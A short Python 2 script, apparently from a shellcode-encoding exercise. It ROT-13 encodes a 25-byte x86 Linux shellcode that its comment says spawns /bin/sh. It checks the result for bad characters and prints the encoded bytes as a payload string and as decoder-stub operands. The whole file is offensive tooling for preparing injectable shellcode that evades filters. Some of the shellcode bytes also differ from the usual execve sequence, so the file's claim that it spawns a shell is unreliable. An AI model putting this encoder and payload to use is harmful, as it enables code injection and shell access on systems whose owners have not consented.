#!/usr/bin/python

# spawns a /bin/sh shell
# 25 bytes

shellcode = "\xf3\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"

# common bad chars
# null, line feed, carriage return

bad_chars = ('\x00\x0a\x0d')

# ROT encoding

rot = 13 # ROT number

# blank arrays to store two forms of encoded values

enc_1 = []
enc_2 = []

for i in bytearray(shellcode):
	j = (i + rot)%256
	enc_1.append(j)
	enc_2.append(j)

	for x in bytearray(bad_chars):
		if (j == x):
			print '[!] Bad Character Warning [!]' 

enc_1 = ("".join("\\x%02x" %c for c in enc_1))  # shellcode
enc_2 = (", ".join("0x%02x" %c for c in enc_2)) # stub

print '[*] Encoded Shellcode: \n' + enc_1
print '[*] Assembly Ready Shellcode: \n' + enc_2
